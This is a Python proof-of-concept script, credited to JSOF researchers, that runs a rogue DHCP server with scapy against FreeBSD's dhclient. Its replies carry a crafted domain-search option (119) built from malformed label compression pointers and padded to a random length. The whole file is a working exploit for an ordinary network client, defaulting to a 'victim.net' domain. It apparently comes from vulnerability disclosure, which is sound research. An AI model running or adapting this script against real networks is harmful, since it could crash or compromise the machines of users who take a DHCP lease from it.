# Copyright (c) 2020 JSOF Ltd.
# Available under MIT License
#
# Authors: Moshe Kol, Shlomi Oberman

from scapy.all import *
from argparse import ArgumentParser
from datetime import datetime
import struct
import random

def p8(x):
    return struct.pack('>B', x)

def encode_payload(payload, initial_max_chunk_length):
    max_chunk_length = initial_max_chunk_length
    p = 0
    enc = b''
    while len(payload) > p:
        chunk_length = min(max_chunk_length, len(payload) - p)
        enc += p8(chunk_length)
        enc += payload[p:p+chunk_length]
        p += chunk_length
        max_chunk_length = 0x3f
    enc += b'\x00'
    return enc

def split_option(opttype, optval, max_chunk_len=255):
    splitted_lv = []
    for i in range((len(optval)//max_chunk_len) + 1):
        chunk_length = min(max_chunk_len, len(optval) - i*max_chunk_len)
        splitted_lv.append(p8(opttype) + p8(chunk_length) + optval[i*max_chunk_len:i*max_chunk_len+chunk_length])
    return splitted_lv

class DHCP_srv(BOOTP_am):
    function_name = "dhcpd"

    def print_reply(self, req, reply):
        BOOTP_am.print_reply(self, req, reply)
        if BOOTP in reply:
            dhcp_hdr = reply[BOOTP]
            print("DHCP packet length: %d" % len(dhcp_hdr))
            print("Time: %s" % str(datetime.now()))
            hexdump(dhcp_hdr)
        print()

    def make_reply(self, req):
        resp = BOOTP_am.make_reply(self, req)
        if DHCP not in req:
            return resp
        
        # Obtain message type
        msg_type = self.__get_msg_type(req[DHCP])
        # Follow DHCP's state machine
        dhcp_options = [("message-type", {1: 2, 3: 5}.get(msg_type, msg_type))]
        dhcp_options += [("server_id", self.gw),
                        ("domain", self.domain),
                        ("router", self.gw),
                        ("subnet_mask", self.netmask),
                        ("renewal_time", self.renewal_time),
                        ("lease_time", self.lease_time),
                        ("name_server", self.gw),
                        ("ip-forwarding", 1)]
        
        # Option 119 (domain search rfc3397)
        payload = b'X'*(random.randrange(self.min_payload_size, self.max_payload_size))

        encoded_payload = encode_payload(payload, 63-2-1)
        option_value = (b'\x3f\xc0\x03' + encoded_payload +
                        b'\x01\x41\xc0\x01'  # Second label
                        )
        dhcp_options += split_option(119, option_value)

        # end dhcp options field
        dhcp_options += ["end"]
        
        resp /= DHCP(options=dhcp_options)
        return resp
    
    def __get_msg_type(self, dhcp_req_rpl):
        for op in dhcp_req_rpl.options:
            if isinstance(op, tuple) and op[0] == "message-type":
                return op[1]
        raise Exception("No message type (option 53) in DHCP request/reply")

def print_headline(msg):
    print("="*(len(msg) + 4))
    print("= " + str(msg) + " =")
    print("="*(len(msg) + 4))

def main(iface, domain, pool, subnet, gateway):
    conf.iface = iface
    print_headline("Starting DHCPv4 server (FreeBSD dhclient Poc)")
    print("Pool:", pool)
    print("Subnet:", subnet)
    print("Gateway:", gateway)
    print()
    dhcp_server = DHCP_srv(pool=Net(pool),
                            domain=domain,
                            network=subnet,
                            gw=gateway,
                            renewal_time=1,
                            lease_time=5)
    dhcp_server.min_payload_size = 60
    dhcp_server.max_payload_size = 500
    dhcp_server()

if __name__ == '__main__':
    parser = ArgumentParser()

    parser.add_argument('-i', '--iface', dest='iface',
                        help='The interface to listen for DHCP requests on')
    parser.add_argument('-p', '--pool', default='192.168.7.128/25', type=str,
                        dest='pool', help='The pool to assign via DHCP (default: 192.168.7.128/25)')
    parser.add_argument('-s', '--subnet', default='192.168.7.0/24', type=str,
                        dest='subnet', help='The network to assign via DHCP (default: 192.168.7.0/24)')
    parser.add_argument('-g', '--gateway', default='192.168.7.254', type=str,
                        dest='gateway', help='The network gateway to respond with (default: 192.168.7.254)')
    parser.add_argument('-d', '--domain', default='victim.net', type=str,
                        dest='domain', help='Domain to assign (default: victim.net)')

    args = parser.parse_args()

    iface = args.iface
    if iface is not None and iface.isdigit():
        iface = IFACES.dev_from_index(int(iface)).description

    main(iface, args.domain, args.pool, args.subnet, args.gateway)
